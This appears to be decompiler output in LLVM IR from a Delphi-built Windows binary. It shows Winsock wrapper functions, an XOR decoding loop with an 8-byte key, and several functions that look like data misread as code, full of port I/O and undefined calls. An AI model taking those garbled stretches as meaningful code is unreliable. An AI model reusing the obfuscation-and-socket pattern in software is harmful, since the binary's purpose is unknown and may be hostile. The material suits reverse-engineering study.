declare i32* @CreateWindowExA(i32, i8*, i8*, i32, i32, i32, i32, i32, i32*, i32*, i32*, i32*) local_unnamed_addr

define i32 @function_404614() local_unnamed_addr {
dec_label_pc_404614:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !224
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = add i8 %21, %15, !insn.addr !239
  %23 = load i32, i32* %eax, align 4, !insn.addr !239
  %24 = inttoptr i32 %23 to i8*, !insn.addr !239
  store i8 %22, i8* %24, align 1, !insn.addr !239
  %25 = load i8, i8* %5, align 4, !insn.addr !240
  %26 = load i32, i32* %eax, align 4
  %27 = trunc i32 %26 to i8, !insn.addr !240
  %28 = add i8 %25, %27, !insn.addr !240
  %29 = inttoptr i32 %26 to i8*, !insn.addr !240
  store i8 %28, i8* %29, align 1, !insn.addr !240
  %30 = load i8, i8* %5, align 4, !insn.addr !241
  %31 = load i32, i32* %eax, align 4
  %32 = trunc i32 %31 to i8, !insn.addr !241
  %33 = add i8 %30, %32, !insn.addr !241
  %34 = inttoptr i32 %31 to i8*, !insn.addr !241
  store i8 %33, i8* %34, align 1, !insn.addr !241
  %35 = load i8, i8* %5, align 4, !insn.addr !242
  %36 = load i32, i32* %eax, align 4
  %37 = trunc i32 %36 to i8, !insn.addr !242
  %38 = add i8 %35, %37, !insn.addr !242
  %39 = inttoptr i32 %36 to i8*, !insn.addr !242
  store i8 %38, i8* %39, align 1, !insn.addr !242
  %40 = add i32 %0, -117, !insn.addr !243
  %41 = inttoptr i32 %40 to i8*, !insn.addr !243
  %42 = load i8, i8* %41, align 1, !insn.addr !243
  %43 = trunc i32 %2 to i8, !insn.addr !243
  %44 = add i8 %42, %43, !insn.addr !243
  store i8 %44, i8* %41, align 1, !insn.addr !243
  %45 = trunc i32 %2 to i16, !insn.addr !244
  %46 = call i8 @__asm_in(i16 %45), !insn.addr !244
  %47 = add i32 %20, -8, !insn.addr !245
  %48 = inttoptr i32 %47 to i32*, !insn.addr !245
  store i32 4212417, i32* %48, align 4, !insn.addr !245
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %50 = add i32 %20, -12, !insn.addr !246
  %51 = inttoptr i32 %50 to i32*, !insn.addr !246
  store i32 %49, i32* %51, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !247
  %52 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %53 = add i32 %52, 1, !insn.addr !248
  %54 = icmp eq i32 %53, 0, !insn.addr !248
  store i32 %53, i32* @global_var_409678, align 4, !insn.addr !248
  %55 = icmp eq i1 %54, false, !insn.addr !249
  br i1 %55, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %56 = call i32 @"@LStrClr"(), !insn.addr !250
  %57 = call i32 @"@LStrClr"(), !insn.addr !251
  %58 = call i32 @"@LStrClr"(), !insn.addr !252
  %59 = call i32 @"@LStrClr"(), !insn.addr !253
  %60 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %61 = add i32 %20, -4, !insn.addr !255
  %62 = inttoptr i32 %61 to i32*, !insn.addr !255
  %63 = load i32, i32* %51, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !257
  store i32 4212424, i32* %62, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_404780(i32 %s) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_404788(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404788:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_404790(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404790:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_404798(%in_addr %in) local_unnamed_addr {
dec_label_pc_404798:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047a0(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047a8(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a8:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047b0(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047b0:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047b8(i8* %name) local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047c0(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047c0:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047c8(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047c8:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047d0() local_unnamed_addr {
dec_label_pc_4047d0:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_4047d8() local_unnamed_addr {
dec_label_pc_4047d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_4047fd() local_unnamed_addr {
dec_label_pc_4047fd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_404802() local_unnamed_addr {
dec_label_pc_404802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404804(i32 %arg1) local_unnamed_addr {
dec_label_pc_404804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404808() local_unnamed_addr {
dec_label_pc_404808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_404810() local_unnamed_addr {
dec_label_pc_404810:
  %ebp.0.reg2mem = alloca i32, !insn.addr !322
  %.reg2mem30 = alloca i8, !insn.addr !322
  %.pre-phi18.reg2mem = alloca i8*, !insn.addr !322
  %factor10.pre-phi.reg2mem = alloca i8, !insn.addr !322
  %eax.6.reg2mem = alloca i32, !insn.addr !322
  %eax.5.reg2mem = alloca i32, !insn.addr !322
  %.reg2mem28 = alloca i8, !insn.addr !322
  %.pre-phi16.reg2mem = alloca i8*, !insn.addr !322
  %.pre-phi17.reg2mem = alloca i8, !insn.addr !322
  %.reg2mem26 = alloca i8, !insn.addr !322
  %eax.4.reg2mem = alloca i32, !insn.addr !322
  %.pre-phi21.reg2mem = alloca i8*, !insn.addr !322
  %.pre-phi22.reg2mem = alloca i8, !insn.addr !322
  %.reg2mem24 = alloca i8, !insn.addr !322
  %eax.3.reg2mem = alloca i32, !insn.addr !322
  %.reg2mem = alloca i8, !insn.addr !322
  %.pre-phi.reg2mem = alloca i8*, !insn.addr !322
  %.pre-phi15.reg2mem = alloca i8, !insn.addr !322
  %eax.2.reg2mem = alloca i32, !insn.addr !322
  %eax.1.reg2mem = alloca i32, !insn.addr !322
  %eax.0.reg2mem = alloca i32, !insn.addr !322
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-15 = alloca i32, align 4
  %6 = add i32 %1, 117, !insn.addr !322
  %7 = inttoptr i32 %6 to i32*, !insn.addr !322
  %8 = load i32, i32* %7, align 4, !insn.addr !322
  %9 = mul i32 %8, 808467313, !insn.addr !322
  %10 = xor i32 %5, 1848851762, !insn.addr !323
  %11 = add i32 %9, 61, !insn.addr !324
  %12 = inttoptr i32 %11 to i32*, !insn.addr !324
  %13 = load i32, i32* %12, align 4, !insn.addr !324
  %14 = xor i32 %13, %1, !insn.addr !324
  %15 = icmp eq i32 %14, 0, !insn.addr !324
  %16 = trunc i32 %3 to i16, !insn.addr !325
  %17 = inttoptr i32 %9 to i32*, !insn.addr !325
  %18 = load i32, i32* %17, align 4, !insn.addr !325
  call void @__asm_outsd(i16 %16, i32 %18), !insn.addr !325
  %19 = icmp eq i1 %15, false, !insn.addr !326
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !326
  br i1 %19, label %20, label %dec_label_pc_404825, !insn.addr !326

; <label>:20:                                     ; preds = %dec_label_pc_404810
  %21 = call i32 @unknown_4855(), !insn.addr !326
  store i32 %21, i32* %eax.0.reg2mem, !insn.addr !326
  br label %dec_label_pc_404825, !insn.addr !326

dec_label_pc_404825:                              ; preds = %20, %dec_label_pc_404810
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %22 = add i32 %0, 106, !insn.addr !327
  %23 = add i32 %22, %2, !insn.addr !327
  %24 = and i32 %23, 65535
  %25 = inttoptr i32 %24 to i64*, !insn.addr !327
  %26 = load i64, i64* %25, align 4, !insn.addr !327
  %27 = call i32 @__asm_bound(i64 %26), !insn.addr !327
  %28 = load i32, i32* %17, align 4, !insn.addr !328
  call void @__asm_outsd(i16 %16, i32 %28), !insn.addr !328
  %29 = inttoptr i32 %eax.0.reload to i8*, !insn.addr !329
  %30 = load i8, i8* %29, align 1, !insn.addr !329
  %31 = trunc i32 %eax.0.reload to i8, !insn.addr !329
  %factor = mul i8 %31, 18
  %32 = add i8 %30, %factor, !insn.addr !330
  store i8 %32, i8* %29, align 1, !insn.addr !330
  %33 = add i32 %9, 116, !insn.addr !331
  %34 = inttoptr i32 %33 to i8*, !insn.addr !331
  %35 = load i8, i8* %34, align 1, !insn.addr !331
  %36 = udiv i32 %3, 256, !insn.addr !331
  %37 = trunc i32 %36 to i8, !insn.addr !331
  %38 = add i8 %35, %37, !insn.addr !331
  %39 = icmp ult i8 %38, %35, !insn.addr !331
  store i8 %38, i8* %34, align 1, !insn.addr !331
  %40 = icmp eq i1 %39, false, !insn.addr !332
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !332
  br i1 %40, label %41, label %dec_label_pc_404859, !insn.addr !332

; <label>:41:                                     ; preds = %dec_label_pc_404825
  %42 = call i32 @unknown_489a(), !insn.addr !332
  store i32 %42, i32* %eax.1.reg2mem, !insn.addr !332
  br label %dec_label_pc_404859, !insn.addr !332

dec_label_pc_404859:                              ; preds = %41, %dec_label_pc_404825
  %43 = icmp eq i8 %38, 0, !insn.addr !331
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %44 = icmp eq i1 %43, false, !insn.addr !333
  br i1 %44, label %dec_label_pc_404859.dec_label_pc_4048cb_crit_edge, label %dec_label_pc_40485b, !insn.addr !333

dec_label_pc_404859.dec_label_pc_4048cb_crit_edge: ; preds = %dec_label_pc_404859
  %.phi.trans.insert = inttoptr i32 %eax.1.reload to i8*
  %.pre = load i8, i8* %.phi.trans.insert, align 1
  %.pre14 = trunc i32 %eax.1.reload to i8, !insn.addr !334
  store i8 %.pre14, i8* %.pre-phi15.reg2mem
  store i8* %.phi.trans.insert, i8** %.pre-phi.reg2mem
  store i8 %.pre, i8* %.reg2mem
  store i32 %eax.1.reload, i32* %eax.3.reg2mem
  br label %dec_label_pc_4048cb

dec_label_pc_40485b:                              ; preds = %dec_label_pc_404859
  %45 = inttoptr i32 %9 to i8*, !insn.addr !335
  %46 = load i8, i8* %45, align 1, !insn.addr !335
  call void @__asm_outsb(i16 %16, i8 %46), !insn.addr !335
  %47 = inttoptr i32 %eax.1.reload to i8*, !insn.addr !336
  %48 = load i8, i8* %47, align 1, !insn.addr !336
  %49 = trunc i32 %eax.1.reload to i8, !insn.addr !336
  %factor1 = mul i8 %49, 27
  %50 = add i8 %48, %factor1, !insn.addr !337
  store i8 %50, i8* %47, align 1, !insn.addr !337
  %51 = load i8, i8* %34, align 1, !insn.addr !338
  %52 = add i8 %51, %37, !insn.addr !338
  %53 = icmp ult i8 %52, %51, !insn.addr !338
  store i8 %52, i8* %34, align 1, !insn.addr !338
  %54 = icmp eq i1 %53, false, !insn.addr !339
  store i32 %eax.1.reload, i32* %eax.2.reg2mem, !insn.addr !339
  br i1 %54, label %55, label %dec_label_pc_40489d, !insn.addr !339

; <label>:55:                                     ; preds = %dec_label_pc_40485b
  %56 = call i32 @unknown_48de(), !insn.addr !339
  store i32 %56, i32* %eax.2.reg2mem, !insn.addr !339
  br label %dec_label_pc_40489d, !insn.addr !339

dec_label_pc_40489d:                              ; preds = %55, %dec_label_pc_40485b
  %57 = icmp eq i8 %52, 0, !insn.addr !338
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %58 = icmp eq i1 %57, false, !insn.addr !340
  br i1 %58, label %dec_label_pc_40490f, label %dec_label_pc_40489f, !insn.addr !340

dec_label_pc_40489f:                              ; preds = %dec_label_pc_40489d
  %59 = load i8, i8* %45, align 1, !insn.addr !341
  call void @__asm_outsb(i16 %16, i8 %59), !insn.addr !341
  %60 = inttoptr i32 %eax.2.reload to i8*
  %61 = load i8, i8* %60, align 1, !insn.addr !342
  %62 = trunc i32 %eax.2.reload to i8
  %factor2 = mul i8 %62, 19
  %63 = add i8 %61, %factor2, !insn.addr !343
  store i8 %63, i8* %60, align 1, !insn.addr !343
  store i8 %62, i8* %.pre-phi15.reg2mem, !insn.addr !343
  store i8* %60, i8** %.pre-phi.reg2mem, !insn.addr !343
  store i8 %63, i8* %.reg2mem, !insn.addr !343
  store i32 %eax.2.reload, i32* %eax.3.reg2mem, !insn.addr !343
  br label %dec_label_pc_4048cb, !insn.addr !343

dec_label_pc_4048cb:                              ; preds = %dec_label_pc_404859.dec_label_pc_4048cb_crit_edge, %dec_label_pc_40489f
  %eax.3.reload = load i32, i32* %eax.3.reg2mem
  %.reload = load i8, i8* %.reg2mem, !insn.addr !334
  %.pre-phi.reload = load i8*, i8** %.pre-phi.reg2mem
  %.pre-phi15.reload = load i8, i8* %.pre-phi15.reg2mem
  %factor5 = mul i8 %.pre-phi15.reload, 8
  %64 = add i8 %.reload, %factor5, !insn.addr !344
  store i8 %64, i8* %.pre-phi.reload, align 1, !insn.addr !344
  %65 = add i32 %4, 98, !insn.addr !345
  %66 = inttoptr i32 %65 to i8*, !insn.addr !345
  %67 = load i8, i8* %66, align 1, !insn.addr !345
  %68 = add i8 %67, %37, !insn.addr !345
  %69 = icmp eq i8 %68, 0, !insn.addr !345
  store i8 %68, i8* %66, align 1, !insn.addr !345
  br i1 %69, label %dec_label_pc_4048cb.dec_label_pc_404954_crit_edge, label %dec_label_pc_4048e0, !insn.addr !346

dec_label_pc_4048cb.dec_label_pc_404954_crit_edge: ; preds = %dec_label_pc_4048cb
  %.pre11 = load i8, i8* %.pre-phi.reload, align 1
  store i8 %.pre11, i8* %.reg2mem26
  br label %dec_label_pc_404954

dec_label_pc_4048e0:                              ; preds = %dec_label_pc_4048cb
  %70 = icmp slt i8 %68, 0, !insn.addr !345
  br i1 %70, label %dec_label_pc_404952, label %dec_label_pc_4048e2, !insn.addr !347

dec_label_pc_4048e2:                              ; preds = %dec_label_pc_4048e0
  %71 = icmp ult i8 %68, %67, !insn.addr !345
  %72 = icmp eq i1 %71, false, !insn.addr !348
  %.pre23 = load i8, i8* %.pre-phi.reload, align 1
  store i8 %.pre23, i8* %.reg2mem24, !insn.addr !348
  store i8 %.pre-phi15.reload, i8* %.pre-phi22.reg2mem, !insn.addr !348
  store i8* %.pre-phi.reload, i8** %.pre-phi21.reg2mem, !insn.addr !348
  store i32 %eax.3.reload, i32* %eax.4.reg2mem, !insn.addr !348
  br i1 %72, label %dec_label_pc_404949, label %dec_label_pc_4048e4, !insn.addr !348

dec_label_pc_4048e4:                              ; preds = %dec_label_pc_4048e2
  %factor6 = mul i8 %.pre-phi15.reload, 21
  %73 = add i8 %.pre23, %factor6, !insn.addr !349
  store i8 %73, i8* %.pre-phi.reload, align 1, !insn.addr !349
  ret i32 %eax.3.reload, !insn.addr !349

dec_label_pc_40490f:                              ; preds = %dec_label_pc_40489d
  %74 = inttoptr i32 %eax.2.reload to i8*
  %75 = load i8, i8* %74, align 1, !insn.addr !350
  %76 = trunc i32 %eax.2.reload to i8
  %factor3 = mul i8 %76, 8
  %77 = add i8 %75, %factor3, !insn.addr !351
  store i8 %77, i8* %74, align 1, !insn.addr !351
  %78 = mul i32 %14, 2, !insn.addr !352
  %79 = add i32 %9, 117, !insn.addr !352
  %80 = add i32 %79, %78, !insn.addr !352
  %81 = inttoptr i32 %80 to i8*, !insn.addr !352
  %82 = load i8, i8* %81, align 1, !insn.addr !352
  %83 = add i8 %82, %37, !insn.addr !352
  %84 = xor i8 %83, %82, !insn.addr !352
  %85 = xor i8 %83, %37, !insn.addr !352
  %86 = and i8 %84, %85, !insn.addr !352
  %87 = icmp slt i8 %86, 0, !insn.addr !352
  store i8 %83, i8* %81, align 1, !insn.addr !352
  %88 = icmp eq i1 %87, false, !insn.addr !353
  br i1 %88, label %dec_label_pc_40490f.dec_label_pc_404962_crit_edge, label %dec_label_pc_404925, !insn.addr !353

dec_label_pc_40490f.dec_label_pc_404962_crit_edge: ; preds = %dec_label_pc_40490f
  %.pre12 = load i8, i8* %74, align 1
  store i8 %76, i8* %.pre-phi17.reg2mem
  store i8* %74, i8** %.pre-phi16.reg2mem
  store i8 %.pre12, i8* %.reg2mem28
  store i32 %eax.2.reload, i32* %eax.5.reg2mem
  br label %dec_label_pc_404962

dec_label_pc_404925:                              ; preds = %dec_label_pc_40490f
  %89 = icmp eq i8 %83, 0, !insn.addr !352
  %90 = icmp eq i1 %89, false, !insn.addr !354
  br i1 %90, label %dec_label_pc_404925.dec_label_pc_404997_crit_edge, label %dec_label_pc_404927, !insn.addr !354

dec_label_pc_404925.dec_label_pc_404997_crit_edge: ; preds = %dec_label_pc_404925
  %.pre13 = load i8, i8* %74, align 1
  store i8 %factor3, i8* %factor10.pre-phi.reg2mem
  store i8* %74, i8** %.pre-phi18.reg2mem
  store i8 %.pre13, i8* %.reg2mem30
  store i32 %14, i32* %ebp.0.reg2mem
  br label %dec_label_pc_404997

dec_label_pc_404927:                              ; preds = %dec_label_pc_404925
  %91 = load i8, i8* %45, align 1, !insn.addr !355
  call void @__asm_outsb(i16 %16, i8 %91), !insn.addr !355
  %92 = load i8, i8* %74, align 1, !insn.addr !356
  %factor4 = mul i8 %76, 14
  %93 = add i8 %92, %factor4, !insn.addr !357
  store i8 %93, i8* %74, align 1, !insn.addr !357
  store i8 %93, i8* %.reg2mem24, !insn.addr !357
  store i8 %76, i8* %.pre-phi22.reg2mem, !insn.addr !357
  store i8* %74, i8** %.pre-phi21.reg2mem, !insn.addr !357
  store i32 %eax.2.reload, i32* %eax.4.reg2mem, !insn.addr !357
  br label %dec_label_pc_404949, !insn.addr !357

